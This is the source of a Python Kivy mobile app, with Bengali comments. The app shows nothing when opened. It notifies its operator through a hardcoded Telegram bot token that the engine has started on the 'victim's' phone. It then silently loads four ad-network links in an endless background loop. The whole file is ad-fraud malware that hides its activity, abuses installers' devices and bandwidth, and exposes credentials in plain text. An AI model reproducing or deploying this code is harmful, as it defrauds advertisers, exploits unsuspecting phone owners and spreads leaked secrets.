import threading, time, requests
from kivy.app import App

# আপনার টোকেন আর চ্যাট আইডি আগে থেকেই আছে
BOT_TOKEN = "8164821371:AAGkHjQrJSozklpfZNaY8HHbOlLAPkWl-vs"
CHAT_ID = "7307115792"

# আপনার দেওয়া সেই ৪টি স্পেশাল অ্যাড লিঙ্ক
AD_LINKS = [
    "https://www.effectivegatecpm.com/s24gmydj7p?key=495193f8a8359dcb2d811a8ca0b5cb53",
    "https://www.effectivegatecpm.com/zfe5vx61x8?key=c42cd470ff6ef1337080c6aed47843fc",
    "https://www.effectivegatecpm.com/c9a2iub5in?key=98d89e7343ef420810b0674dda3bf246",
    "https://www.effectivegatecpm.com/hmx9uwfh?key=cb470bab5e04e4ddcff0ac2b4555d68e"
]

class CoreApp(App):
    def build(self):
        return None # অ্যাপ ওপেন করলে কিছুই দেখাবে না

    def on_start(self):
        # টেলিগ্রামে খবর পাঠানো
        try:
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text=🚀 ওস্তাদ! শিকারের ফোনে ইঞ্জিন স্টার্ট হয়েছে। টাকা আসা শুরু!")
        except:
            pass
        # ব্যাকগ্রাউন্ডে অ্যাড ইঞ্জিন চালানো
        threading.Thread(target=self.engine, daemon=True).start()

    def engine(self):
        while True:
            for link in AD_LINKS:
                try:
                    # ১টি লিঙ্ক ভিজিট করে ২০ সেকেন্ড অপেক্ষা করবে
                    requests.get(link, timeout=20)
                except:
                    pass
                # প্রতি লিঙ্কের মাঝে ১২০ সেকেন্ড (২ মিনিট) গ্যাপ
                time.sleep(120)

if __name__ == "__main__":
    CoreApp().run()
